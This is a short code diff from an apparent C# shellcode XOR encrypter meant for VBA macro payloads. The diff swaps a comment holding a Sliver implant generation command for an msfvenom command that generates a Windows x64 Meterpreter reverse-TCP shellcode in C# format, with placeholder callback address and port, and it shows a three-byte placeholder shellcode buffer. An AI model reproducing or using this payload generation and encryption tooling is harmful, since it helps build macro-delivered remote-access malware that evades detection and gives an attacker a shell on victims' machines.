@@ -14,7 +14,7 @@ namespace XOR_ShellCode_Encrypter_Helper_VBA_3Byte
             RNGCryptoServiceProvider rngKey = new RNGCryptoServiceProvider();
             rngKey.GetBytes(key);
 
-            // Sliver: sliver > generate --mtls <IP>:<PORT> --format csharp --save /tmp/sc.cs
+            // msfvenom: msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp -o /tmp/sc.cs
             // Paste the full byte array here (placeholder 3 bytes shown)
             byte[] buf = new byte[3] {0xfc,0xe8,0x8f};
 
